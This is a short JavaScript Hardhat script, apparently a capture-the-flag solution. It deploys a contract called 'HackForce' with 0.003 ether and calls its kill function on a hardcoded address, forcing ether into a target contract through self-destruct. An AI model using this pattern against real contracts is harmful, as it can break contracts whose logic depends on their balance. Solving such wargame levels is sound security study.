const main = async () => {
  const [signer] = await ethers.getSigners();
  const contractFactory = await ethers.getContractFactory('HackForce');
  const contract = await contractFactory.deploy({
    value: hre.ethers.utils.parseEther('0.003'),
  });
  await contract.deployed();
  let txn = await contract.kill('0x437d47A4bDa170f3383bB36F9a62431CcBFE7E3b');
  await txn.wait();

};

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (e) {
    console.log(e);
    process.exit(1);
  }
};
runMain();
